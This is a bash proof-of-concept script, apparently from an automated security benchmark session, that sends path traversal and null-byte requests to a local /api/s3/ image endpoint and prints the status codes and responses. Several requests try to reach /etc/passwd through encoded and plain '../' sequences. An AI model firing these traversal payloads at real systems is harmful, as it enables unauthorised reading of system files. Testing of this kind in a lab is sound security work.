#!/bin/bash
# POC: Test the /api/s3/ endpoint for path traversal vulnerability and 500 error behavior
# Target: ./repo
# Created: 2025-11-07T21:45:47.383Z
# Session: benchmark-XBEN-084-24-mhpdbk6l

# POC for Broken S3 Image API Endpoint Path Traversal Vulnerability
# Tests the /api/s3/ endpoint for path traversal and error handling issues

TARGET_URL="${1:-http://localhost:3000}"
API_ENDPOINT="/api/s3"

echo "[*] Testing S3 Image API Endpoint for Path Traversal Vulnerability"
echo "[*] Target: $TARGET_URL$API_ENDPOINT"
echo ""

# Test 1: Valid image filename
echo "[TEST 1] Valid image filename (will_rogers.jpg)"
echo "URL: $TARGET_URL$API_ENDPOINT/will_rogers.jpg"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL$API_ENDPOINT/will_rogers.jpg")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE"
echo "Response preview: ${BODY:0:200}"
echo ""

# Test 2: Double-encoded path traversal (..%2Fetc%2Fpasswd)
echo "[TEST 2] Double-encoded path traversal (..%2Fetc%2Fpasswd)"
echo "URL: $TARGET_URL$API_ENDPOINT/..%2Fetc%2Fpasswd"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL$API_ENDPOINT/..%2Fetc%2Fpasswd")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE"
echo "Response preview: ${BODY:0:200}"
echo ""

# Test 3: Single-encoded path traversal (%2e%2e/etc/passwd)
echo "[TEST 3] Single-encoded path traversal (%2e%2e/etc/passwd)"
echo "URL: $TARGET_URL$API_ENDPOINT/%2e%2e/etc/passwd"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL$API_ENDPOINT/%2e%2e/etc/passwd")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE"
echo "Response preview: ${BODY:0:200}"
echo ""

# Test 4: Plain path traversal (../etc/passwd)
echo "[TEST 4] Plain path traversal (../etc/passwd)"
echo "URL: $TARGET_URL$API_ENDPOINT/../etc/passwd"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL$API_ENDPOINT/../etc/passwd")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE"
echo "Response preview: ${BODY:0:200}"
echo ""

# Test 5: Null byte injection attempt
echo "[TEST 5] Null byte injection attempt (will_rogers.jpg%00.txt)"
echo "URL: $TARGET_URL$API_ENDPOINT/will_rogers.jpg%00.txt"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL$API_ENDPOINT/will_rogers.jpg%00.txt")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE"
echo "Response preview: ${BODY:0:200}"
echo ""

# Summary
echo "[SUMMARY]"
echo "The /api/s3/ endpoint exhibits potential path traversal vulnerability indicators:"
echo "- Returns 500 errors for various path patterns"
echo "- Inconsistent error handling between encoded and non-encoded traversal attempts"
echo "- Processes user-supplied file paths without proper validation"
echo "- Different HTTP status codes suggest parameter processing at endpoint"